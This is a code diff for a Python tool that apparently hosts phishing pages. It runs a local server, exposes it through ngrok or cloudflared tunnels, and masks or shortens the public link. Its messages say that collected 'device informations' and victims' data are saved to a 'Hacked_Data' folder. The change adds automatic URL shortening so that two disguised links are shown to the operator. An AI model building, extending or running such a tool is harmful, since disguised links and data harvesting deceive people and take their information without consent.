@@ -448,12 +448,13 @@ def tunnel():
 def alert_panel(url = "", mask = ""):
     if not (url == "") and not (mask == ""):
         masked_url = mask_url(url, mask)
+    if (mask == "") and not (url == ""):
+        masked_url = short_url(url)
     logo()
     print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m Successfully Hosted At : \033[37mhttp://127.0.0.1:"+port)
     if not (url == ""):
-        print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m URL : \033[37m"+url)
-        if not (mask == ""):
-            print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m Masked URL : \033[37m"+masked_url)
+        print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m URL 1 : \033[37m"+url)
+        print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m URL 2 : \033[37m "+masked_url)
     if (menu.method == "about_device"):
         print("\n\033[92m\033[94m[\033[37m+\033[94m]\033[92m Use a VPN To Get Extra Device Informations...")
     print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m All Your Data is Saved In \033[37mHacked_Data \033[92mFolder")
@@ -508,10 +509,7 @@ def menu():
     elif (op == "#"):
         logout()
 
-
-
-    
-###NoCut###
+#MainProcess#
 if __name__ == "__main__":
     if not os.path.exists(".server/ngrok") or not os.path.exists(".server/cloudflared"):
         os.system("bash setup.sh")
@@ -520,5 +518,3 @@ if __name__ == "__main__":
     os.system("rm -rf .server/upload/* > /dev/null 2>&1")
     killer()
     menu()
-
-
